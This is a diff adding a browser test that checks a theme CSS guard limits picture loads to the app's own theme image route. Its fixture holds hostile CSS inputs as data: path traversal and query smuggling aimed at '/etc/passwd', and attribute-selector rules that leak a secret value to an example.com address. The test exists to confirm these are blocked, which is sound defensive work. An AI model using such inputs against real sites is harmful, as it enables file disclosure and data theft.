@@ -1,6 +1,7 @@
 // FILE: themeCss.browser.ts
 // Purpose: Theme CSS cannot make the browser load a file from another host, and cannot write
-//          text, while its safe rules still apply.
+//          text, while its safe rules still apply. A stored theme picture loads only from
+//          Moss's own theme image route.
 // Layer: Web browser test (real Chromium CSS parser, network requests watched by Playwright)
 // Origin: extends apps/web/src/themeCss.browser.test.ts from T3 Code
 //   (https://github.com/pingdotgg/t3code, MIT) at 1d1489d0b8 with a request probe and Moss's
@@ -169,6 +170,115 @@ describe("theme CSS guard", () => {
       expect(keptCssText()).not.toContain("data-theme-css-probe");
     } finally {
       probe.remove();
+    }
+  });
+});
+
+// A stored theme picture: 64 lower-case hex and a type. Only this shape may load, and only from
+// Moss's own theme image route; the guard writes that address itself.
+const PICTURE_A = `${"0123456789abcdef".repeat(4)}.png`;
+const PICTURE_B = `${"fedcba9876543210".repeat(4)}.webp`;
+
+const PICTURE_THEME_CSS = String.raw`
+  :root { --picture: url(moss-theme-image:${PICTURE_B}); }
+  [data-theme-picture-plain] { background-image: url(moss-theme-image:${PICTURE_A}); }
+  [data-theme-picture-quoted] { background: url( "moss-theme-image:${PICTURE_B}" ) right bottom / auto 50% no-repeat !important; }
+  [data-theme-picture-var] { background-image: var(--picture); }
+  [data-theme-picture-escaped] { background-image: url(moss-theme-image\3a ${PICTURE_A}); }
+  [data-theme-picture-escaped-scheme] { background-image: u\72l(moss-theme-image:${PICTURE_A}); }
+  [data-theme-picture-host] { background-image: url(moss-theme-image://example.com/${PICTURE_A}); }
+  [data-theme-picture-traversal] { background-image: url(moss-theme-image:../../api/local-image?path=/etc/passwd); }
+  [data-theme-picture-query] { background-image: url(moss-theme-image:${PICTURE_A}?path=/etc/passwd); }
+  [data-theme-picture-upper] { background-image: url(moss-theme-image:${PICTURE_A.toUpperCase()}); }
+  [data-theme-picture-svg] { background-image: url(moss-theme-image:${PICTURE_A.replace(".png", ".svg")}); }
+  [data-theme-picture-pair] { background-image: url(moss-theme-image:${PICTURE_A}), url(https://example.com/pair); }
+  [data-theme-picture-set] { background-image: image-set(url(moss-theme-image:${PICTURE_A}) 1x); }
+  [data-theme-picture-attr][data-secret^="a"] { background-image: url(moss-theme-image:${PICTURE_A}); }
+  [data-theme-picture-attr][data-secret^="b"] { background-image: url(moss-theme-image:${PICTURE_B}); }
+  [data-theme-picture-attr][data-secret^="c"] { background-image: url(https://example.com/leak-c); }
+`;
+
+describe("theme CSS guard with stored pictures", () => {
+  afterEach(() => {
+    applyThemeCss(undefined);
+  });
+
+  it("loads a stored picture only from Moss's own theme image route, and nothing else", async () => {
+    const names = [
+      "plain",
+      "quoted",
+      "var",
+      "escaped",
+      "escaped-scheme",
+      "host",
+      "traversal",
+      "query",
+      "upper",
+      "svg",
+      "pair",
+      "set",
+      "attr",
+    ];
+    const probes = Object.fromEntries(
+      names.map((name) => [name, mountProbe(`data-theme-picture-${name}`)]),
+    );
+    probes.attr!.setAttribute("data-secret", "b-value");
+    const canary = mountProbe("data-theme-css-canary");
+    const canaryStyle = document.createElement("style");
+    canaryStyle.textContent =
+      "[data-theme-css-canary] { background-image: url(https://example.org/canary-pictures.png); }";
+    const ownRoute = `${window.location.origin}/api/theme-images/`;
+    try {
+      await commands.setServiceWorkerBypass(true);
+      await commands.beginAppThumbnailRequestProbe("no app frame");
+      performance.clearResourceTimings();
+      document.head.append(canaryStyle);
+      void getComputedStyle(canary).backgroundImage;
+      applyThemeCss(PICTURE_THEME_CSS);
+      for (const probe of Object.values(probes)) void getComputedStyle(probe).backgroundImage;
+      await settle();
+      const requests = await commands.endAppThumbnailRequestProbe();
+
+      // Only the canary reached another host.
+      expect(requests.filter((request) => !request.local)).toEqual([
+        { resourceType: "image", local: false, appFrame: false },
+      ]);
+      // Every picture load is the theme image route with an id of the fixed shape, nothing more.
+      const pictureLoads = performance
+        .getEntriesByType("resource")
+        .map((entry) => entry.name)
+        .filter((name) => name.includes("theme-image"));
+      expect(pictureLoads.length).toBeGreaterThan(0);
+      for (const name of pictureLoads) {
+        expect(name).toMatch(
+          /^https?:\/\/[^/]+\/api\/theme-images\/[0-9a-f]{64}\.(?:png|jpg|webp|gif|avif)$/,
+        );
+        expect(name.startsWith(ownRoute)).toBe(true);
+      }
+      expect(keptCssText()).not.toContain("moss-theme-image:");
+      expect(keptCssText()).not.toContain("example.com");
+      expect(keptCssText()).not.toContain("passwd");
+
+      const background = (name: string) => getComputedStyle(probes[name]!).backgroundImage;
+      expect(background("plain")).toBe(`url("${ownRoute}${PICTURE_A}")`);
+      expect(background("quoted")).toBe(`url("${ownRoute}${PICTURE_B}")`);
+      expect(background("var")).toBe(`url("${ownRoute}${PICTURE_B}")`);
+      // Choosing a picture by what an attribute holds still only reaches Moss's own route.
+      expect(background("attr")).toBe(`url("${ownRoute}${PICTURE_B}")`);
+      // The browser decodes escapes before the guard reads a value, so an escaped reference is
+      // the same fixed-shape reference: it can only reach the same route, or nothing.
+      for (const name of ["escaped", "escaped-scheme"]) {
+        expect(["none", `url("${ownRoute}${PICTURE_A}")`], name).toContain(background(name));
+      }
+      for (const name of ["host", "traversal", "query", "upper", "svg", "pair", "set"]) {
+        expect(background(name), name).toBe("none");
+      }
+    } finally {
+      await commands.endAppThumbnailRequestProbe();
+      await commands.setServiceWorkerBypass(false);
+      canaryStyle.remove();
+      canary.remove();
+      for (const probe of Object.values(probes)) probe.remove();
     }
   });
 });
